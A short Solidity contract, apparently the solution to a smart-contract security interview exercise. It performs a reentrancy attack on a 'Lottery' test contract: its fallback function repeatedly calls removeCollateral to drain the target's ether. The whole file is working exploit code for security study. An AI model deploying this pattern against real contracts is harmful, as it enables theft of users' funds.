// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

import "./InterviewTest1.sol";

contract Attack2 {
  Lottery public interviewTest;
  BasicERC20 public weth;

  constructor(address payable _interviewTestAddress) {
    weth = BasicERC20("WETH", "WETH", 18);
    interviewTest = Lottery(_interviewTestAddress);
  }

  // Fallback is called when DepositFunds sends Ether to this contract
  receive() external payable {
    if(address(interviewTest).balance >= 1 ether) {
      interviewTest.removeCollateral(1 ether);
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether, "insufficient balance.");
    interviewTest.addCollateral{value: 1 ether}();
    interviewTest.removeCollateral(1 ether);
  }
}